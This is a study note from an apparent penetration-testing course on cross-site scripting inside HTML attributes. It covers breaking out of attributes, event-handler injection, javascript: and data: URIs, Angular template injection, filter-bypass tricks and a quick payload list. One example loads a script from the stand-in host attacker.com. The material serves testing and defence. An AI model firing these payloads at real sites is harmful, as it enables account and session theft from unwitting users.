---
tags: [vapt, xss, intermediate]
difficulty: intermediate
module: "07 - XSS"
topic: "07.07 XSS in HTML Attributes"
---

# 07.07 — XSS in HTML Attributes

## Why Attribute Context Matters

If your input lands inside an HTML attribute, you can't just inject `<script>` — you first need to break out of the attribute context, then add your payload.

```
INPUT LANDS IN:
  <input value="YOUR_INPUT">
                 ↑ inside an attribute!
  
CANNOT DO:
  <input value="<script>alert(1)</script>">
  (the <script> is inside an attribute — browser doesn't execute it)
  
MUST DO:
  Close the attribute → close the tag → inject your payload:
  <input value=""><script>alert(1)</script>
                ↑ closed attribute + tag → injected as new HTML!
```

---

## Breaking Out of Attribute Context

### Double-Quoted Attribute

```
ORIGINAL HTML:  <input value="USER_INPUT">
INJECT:         "><script>alert(1)</script>
RESULT:         <input value=""><script>alert(1)</script>
                               ↑ valid script tag!
```

### Single-Quoted Attribute

```
ORIGINAL HTML:  <input value='USER_INPUT'>
INJECT:         '><script>alert(1)</script>
RESULT:         <input value=''><script>alert(1)</script>
```

### Unquoted Attribute

```
ORIGINAL HTML:  <input value=USER_INPUT>
INJECT:         ><script>alert(1)</script>
RESULT:         <input value=><script>alert(1)</script>
```

---

## Event Handler Injection (Without Breaking Out)

Instead of closing the tag, inject an event handler directly in the attribute:

```html
<!-- DOUBLE-QUOTED ATTRIBUTE: -->
ORIGINAL: <input value="USER_INPUT">
INJECT:   " onmouseover="alert(1)
RESULT:   <input value="" onmouseover="alert(1)">
          → Fires when mouse moves over the input!

<!-- AUTOFOCUS (no user interaction needed): -->
" autofocus onfocus="alert(1)
RESULT: <input value="" autofocus onfocus="alert(1)">
        → Fires automatically when page loads!

<!-- SINGLE-QUOTED: -->
' onmouseover='alert(1)
RESULT: <input value='' onmouseover='alert(1)'>
```

---

## Event Handlers That Don't Need User Interaction

```html
<!-- AUTO-EXECUTING (no click/hover needed): -->
<body onload="alert(1)">
<img src=x onerror="alert(1)">         ← broken src triggers automatically
<video src=x onerror="alert(1)">
<audio src=x onerror="alert(1)">
<input autofocus onfocus="alert(1)">   ← autofocus triggers automatically
<details open ontoggle="alert(1)">     ← open attribute triggers toggle
<svg onload="alert(1)">

<!-- COMMON WITH INTERACTION: -->
onclick, ondblclick, onmouseover, onmouseout, onmousemove
onkeydown, onkeyup, onkeypress
onchange, onblur, oninput, onsubmit
onpaste, oncut, oncopy
```

---

## href/src Attribute Injection

```html
<!-- href ATTRIBUTE (for anchor tags): -->
ORIGINAL: <a href="USER_INPUT">Link</a>

INJECT javascript: URI:
  javascript:alert(1)
RESULT: <a href="javascript:alert(1)">Link</a>
        → User clicks → alert fires!

INJECT data: URI:
  data:text/html,<script>alert(1)</script>
  
<!-- src ATTRIBUTE (for script/img/iframe): -->
ORIGINAL: <script src="USER_INPUT"></script>
INJECT:   https://attacker.com/evil.js
RESULT:   <script src="https://attacker.com/evil.js"></script>
          → Loads attacker's script!

ORIGINAL: <img src="USER_INPUT">
INJECT:   x onerror=alert(1)  (if src is not quoted)
```

---

## style Attribute Injection

```html
<!-- style ATTRIBUTE: -->
ORIGINAL: <div style="color: USER_INPUT">

<!-- INJECT CSS expression (IE only): -->
expression(alert(1))
RESULT: <div style="color: expression(alert(1))"> → only in old IE!

<!-- INJECT to break out: -->
"><img src=x onerror=alert(1)>
```

---

## class/id/name Attribute Injection

```html
<!-- These usually can't execute JS directly: -->
ORIGINAL: <div class="USER_INPUT">
INJECT:   "><script>alert(1)</script>
RESULT:   <div class=""><script>alert(1)</script>
          → breaks out of class, injects script!

<!-- ANGULAR (if app uses Angular): -->
INJECT: {{constructor.constructor('alert(1)')()}}
RESULT: <div class="{{constructor.constructor('alert(1)')()}}">
        → Angular template injection → XSS!
```

---

## Detecting Attribute Context

```bash
# STEP 1: Submit a canary value and view source:
# canary: xsstestXXX

# STEP 2: Look for the canary in source:
# Case 1 - In body:        <p>xsstestXXX</p>                 → HTML context
# Case 2 - In attribute:   <input value="xsstestXXX">        → need to break out
# Case 3 - In JS string:   var x = "xsstestXXX";             → need JS escape
# Case 4 - In URL attr:    href="/profile?q=xsstestXXX"       → URL context

# STEP 3: TEST BASED ON CONTEXT:
# Attribute with double quotes:
?q=xsstestXXX" onmouseover="alert(1)
# Attribute with single quotes:
?q=xsstestXXX' onmouseover='alert(1)
# Unquoted attribute:
?q=xsstestXXX onmouseover=alert(1)

# CHECK WHAT CHARS ARE ENCODED:
# If " is &quot; → can't break out of double-quoted attribute
# If ' is &#x27; or &apos; → can't break out of single-quoted
# If neither encoded → vulnerable!
```

---

## HTML Attribute XSS Bypass Techniques

```html
<!-- IF onerror= IS FILTERED: -->
<img src=x oNeRrOr=alert(1)>      <!-- case variation -->
<img src=x onE&#114;ror=alert(1)> <!-- HTML entity in event name -->

<!-- IF = IS FILTERED: -->
<img src=x onerror=alert(1)>      (no = in argument)

<!-- IF SPACE IS FILTERED: -->
<img/src=x/onerror=alert(1)>      (use / as separator)
<img%09src=x%09onerror=alert(1)>  (use tab %09)

<!-- IF ALERT IS FILTERED: -->
<img src=x onerror=confirm(1)>    (confirm)
<img src=x onerror=prompt(1)>     (prompt)
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>  (base64 encoded alert(1))

<!-- IF () ARE FILTERED: -->
<img src=x onerror=alert`1`>      (backtick instead of parens - template literal)
<svg/onload=alert&lpar;1&rpar;>   (HTML entities for parens)
```

---

## Practical Testing Payloads for Attributes

```html
<!-- QUICK TEST SET FOR ATTRIBUTE INJECTION: -->
1. "><script>alert(document.domain)</script>
2. " onmouseover="alert(1)
3. " autofocus onfocus="alert(1)
4. '><script>alert(document.domain)</script>
5. ' onmouseover='alert(1)
6. javascript:alert(1)
7. ><img src=x onerror=alert(1)>
8. " style="animation-name:rotation" onanimationstart="alert(1)
```

---

## Related Notes
- [[02 - Reflected XSS]] — XSS overview and context
- [[08 - XSS in JavaScript Context]] — JS string escaping
- [[14 - XSS Filter Bypass Techniques]] — bypassing filters
- [[21 - XSS Payloads Comprehensive List]] — full payload reference
